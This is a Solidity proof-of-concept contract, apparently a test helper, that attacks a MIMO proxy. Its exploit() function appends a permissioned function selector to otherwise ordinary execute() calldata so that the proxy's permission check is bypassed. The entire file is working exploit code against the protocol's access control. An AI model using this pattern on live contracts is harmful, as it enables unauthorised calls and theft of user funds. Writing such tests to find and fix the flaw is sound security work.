// SPDX-License-Identifier: MIT
pragma solidity 0.8.10;

import "../proxy/interfaces/IMIMOProxy.sol";
import "../libraries/Errors.sol";

contract SelectorBypass {
  IMIMOProxy public mimoProxy;

  constructor(IMIMOProxy _mimoProxy) {
    mimoProxy = _mimoProxy;
  }

  function exploit(address target, bytes4 permissionedSelector) external {
    bytes memory usualCallData = abi.encodeWithSelector(mimoProxy.execute.selector, target, new bytes(0));
    (bool success, bytes memory response) = address(mimoProxy).call(
      abi.encodePacked(usualCallData, abi.encodePacked(permissionedSelector))
    );
    if (!success) {
      if (response.length > 0) {
        assembly {
          let returndata_size := mload(response)
          revert(add(32, response), returndata_size)
        }
      } else {
        revert Errors.EXECUTION_REVERTED();
      }
    }
  }
}
